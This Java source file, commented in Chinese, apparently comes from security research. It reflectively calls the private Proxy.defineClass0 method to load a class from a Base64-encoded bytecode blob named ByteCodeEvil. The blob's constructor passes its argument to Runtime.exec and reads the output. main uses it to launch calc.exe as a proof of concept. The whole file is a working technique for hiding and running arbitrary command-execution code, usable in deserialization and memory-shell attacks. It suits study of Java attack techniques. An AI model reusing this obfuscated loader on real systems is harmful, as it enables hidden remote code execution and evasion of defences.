package com.proxy_define0;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Base64;

public class Define0_Test {
    public static Class<?> defineByProxy(String className, byte[] classBytes) throws Exception {
        // 获取系统的类加载器
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
        // 反射java.lang.reflect.Proxy类获取其中的defineClass0方法
        Method method = Proxy.class.getDeclaredMethod("defineClass0",ClassLoader.class, String.class, byte[].class, int.class, int.class);
        // 修改方法的访问权限
        method.setAccessible(true);
        // 反射调用java.lang.reflect.Proxy.defineClass0()方法
        // 动态向JVM注册对象
        // 返回一个 Class 对象
        return (Class<?>) method.invoke(null, classLoader, className, classBytes, 0, classBytes.length);
    }
    public static void main(String[] args) throws Exception {
        byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQATgoAEQAsBwAtCgACACwHAC4HAC8KADAAMQoAMAAyCgAzADQKAAUANQoABAA2CgAEADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEkxjb20vQnl0ZUNvZGVFdmlsOwEAA2NtZAEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcAPAcAPgcALQcALgEACkV4Y2VwdGlvbnMHAD8BAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAEUJ5dGVDb2RlRXZpbC5qYXZhDAAUAEABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwBBDABCAEMMAEQARQcARgwARwBIDAAUAEkMABQASgwASwApDABMAE0BAAEKDAAoACkMABIAEwEAEGNvbS9CeXRlQ29kZUV2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7ACEAEAARAAAAAQAAABIAEwAAAAIAAQAUABUAAgAWAAAA0gAGAAUAAABHKrcAAbsAAlm3AANNuwAEWbsABVm4AAYrtgAHtgAItwAJtwAKTi22AAtZOgTGABIsGQS2AAwSDbYADFen/+oqLLYADrUAD7EAAAADABcAAAAeAAcAAAAJAAQACwAMAAwAJQAOAC8ADwA+ABEARgASABgAAAA0AAUAAABHABkAGgAAAAAARwAbABMAAQAMADsAHAAdAAIAJQAiAB4AHwADACwAGwAgABMABAAhAAAAGwAC/wAlAAQHACIHACMHACQHACUAAPwAGAcAIwAmAAAABAABACcAAQAoACkAAQAWAAAALwABAAEAAAAFKrQAD7AAAAACABcAAAAGAAEAAAAXABgAAAAMAAEAAAAFABkAGgAAAAEAKgAAAAIAKw==");
        Class<?> testClass = defineByProxy("com.ByteCodeEvil", bytes);
        Constructor<?> constructor = testClass.getConstructor(String.class);
        constructor.newInstance("calc.exe");
    }
}
